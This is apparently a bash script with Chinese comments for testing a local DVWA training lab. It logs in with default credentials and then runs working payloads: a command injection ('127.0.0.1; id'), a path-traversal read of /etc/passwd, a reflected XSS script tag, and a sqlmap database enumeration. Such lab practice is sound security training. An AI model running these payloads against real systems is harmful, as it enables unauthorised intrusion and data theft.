#!/bin/bash
DVWA_URL=http://192.168.127.128/DVWA
COOKIE=/tmp/dvwa_cookie.txt

echo "=== DVWA漏洞测试 ==="
echo ""

# 1. 获取初始Cookie
curl -s -c $COOKIE $DVWA_URL/login.php > /dev/null
echo "[1] 已获取初始Cookie"

# 2. 提取token
USER_TOKEN=$(grep 'user_token' $COOKIE | tail -1 | awk '{print $7}')
echo "[2] Token: $USER_TOKEN"

# 3. 登录
curl -s -b $COOKIE -c $COOKIE -X POST $DVWA_URL/login.php \
  -d "username=admin&password=password&Login=Login&user_token=$USER_TOKEN" > /dev/null
echo "[3] 已登录"

# 4. 读取最终Cookie
PHPSESSID=$(grep 'PHPSESSID' $COOKIE | awk '{print $7}')
echo "[4] PHPSESSID: $PHPSESSID"
echo ""

# 5. 测试1：命令注入
echo "--- 测试1：命令注入 ---"
RESULT=$(curl -s -b "security=low; PHPSESSID=$PHPSESSID" -X POST $DVWA_URL/vulnerabilities/exec/ -d "ip=127.0.0.1; id&Submit=Submit")
if echo "$RESULT" | grep -q "uid="; then
  echo "✅ 成功："
  echo "$RESULT" | grep -o "uid=.*"
else
  echo "⚠️ 需要检查"
fi
echo ""

# 6. 测试2：文件包含
echo "--- 测试2：文件包含 ---"
curl -s -b "security=low; PHPSESSID=$PHPSESSID" "$DVWA_URL/vulnerabilities/fi/?page=../../../../etc/passwd" | head -5
echo ""

# 7. 测试3：XSS反射
echo "--- 测试3：XSS反射 ---"
RESULT=$(curl -s -b "security=low; PHPSESSID=$PHPSESSID" "$DVWA_URL/vulnerabilities/xss_r/?name=<script>alert(1)</script>")
if echo "$RESULT" | grep -q "alert(1)"; then
  echo "✅ XSS存在"
fi
echo ""

# 8. 测试4：SQL注入（快速检测）
echo "--- 测试4：SQL注入检测 ---"
echo "正在启动sqlmap..."
sqlmap -u "$DVWA_URL/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=$PHPSESSID" --dbs --batch 2>&1 | head -50

# 清理
rm -f $COOKIE
echo ""
echo "=== 测试完成 ==="